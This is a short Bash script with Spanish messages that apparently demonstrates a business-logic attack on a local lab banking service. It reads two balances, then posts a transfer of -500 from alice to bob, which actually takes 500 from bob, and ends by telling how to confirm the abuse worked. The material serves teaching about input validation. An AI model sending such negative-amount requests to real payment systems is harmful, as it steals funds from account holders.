#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"; PORT="${PORT:-8060}"
echo "== Ataque: transferencia con monto NEGATIVO (abuso de diseno) =="
echo "Saldos iniciales:"; curl -s "http://127.0.0.1:$PORT/balance/alice"; echo; curl -s "http://127.0.0.1:$PORT/balance/bob"; echo
echo "alice transfiere -500 a bob (en realidad le roba 500 a bob):"
curl -s -X POST "http://127.0.0.1:$PORT/transfer" --data "from=alice&to=bob&amount=-500"; echo
echo "Si el saldo de alice SUBIO y el de bob BAJO, el abuso funciono."
